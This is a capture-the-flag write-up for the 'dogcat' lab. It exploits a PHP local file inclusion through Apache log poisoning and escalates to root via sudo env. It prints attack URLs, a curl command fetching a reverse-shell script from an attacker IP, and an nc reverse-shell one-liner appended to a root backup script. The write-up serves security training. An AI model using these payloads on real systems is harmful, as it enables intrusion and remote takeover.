## Recon

```
└─# nmap -sS -vvv -Pn --min-rate 2000 $ip
Host is up, received user-set (1.1s latency).
Scanned at 2023-11-11 23:38:58 GMT for 28s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 60
```
I see this `http://10.10.44.239/?view=`
I tried lfi but not work, so i will try php filter
http://10.10.44.239/?view=php://filter/read=convert.base64-encode/resource=./dog/../index
```
└─# echo $base | base64 -d
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```
I will try now to get RCE using log poisoning.
http://10.10.44.239/?view=php://filter/read=convert.base64-encode/resource=./dog/../../../../../../../../var/log/apache2/access.log&ext

I tried this : http://10.10.4.115/?view=./dog/../../../../../../etc/passwd&ext
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```
http://10.10.4.115/?view=./dog/../../../../../../../../../var/log/apache2/access.log&ext=
http://10.10.4.115/?view=./dog/../../../../../../../../../var/log/apache2/access.log&ext=&cmd=ls%20/
http://10.10.4.115/?view=./dog/../../../../../../../../../var/log/apache2/access.log&ext=&cmd=curl%20-o%20rev.php%2010.4.26.216/rev.php
I execute my php now
```
http://10.10.4.115/?view=./dog/../../../../../../../../../var/log/apache2/access.log&ext=&cmd=php%20rev.php

ls -la
total 48
drwxrwxrwx 4 www-data www-data 4096 Nov 12 15:35 .
drwxr-xr-x 1 root     root     4096 Mar 10  2020 ..
-rw-r--r-- 1 www-data www-data   51 Mar  6  2020 cat.php
drwxr-xr-x 2 www-data www-data 4096 Nov 12 15:19 cats
-rw-r--r-- 1 www-data www-data   51 Mar  6  2020 dog.php
drwxr-xr-x 2 www-data www-data 4096 Nov 12 15:19 dogs
-rw-r--r-- 1 www-data www-data   56 Mar  6  2020 flag.php
-rw-r--r-- 1 www-data www-data  958 Mar 10  2020 index.php
-rw-r--r-- 1 www-data www-data 9285 Nov 12 15:35 rev.php
-rw-r--r-- 1 www-data www-data  725 Mar 10  2020 style.css
cat flag.php
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```

## Escalation
```
sudo -l
Matching Defaults entries for www-data on c5c93780b439:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on c5c93780b439:
    (root) NOPASSWD: /usr/bin/env

    RunAsUsers: root
    Options: !authenticate
    Commands:
    /usr/bin/env
sudo /usr/bin/env /bin/sh
whoami
root

flag3.txt
cat flag3.txt
THM{D1ff3r3nt_3nv1ronments_874112}


```
## Escaping the Container

```
cd /opt/backups
ls
backup.sh
backup.tar
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.4.26.216 1338 >/tmp/f' >> backup.sh
cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.4.26.216 1338 >/tmp/f
```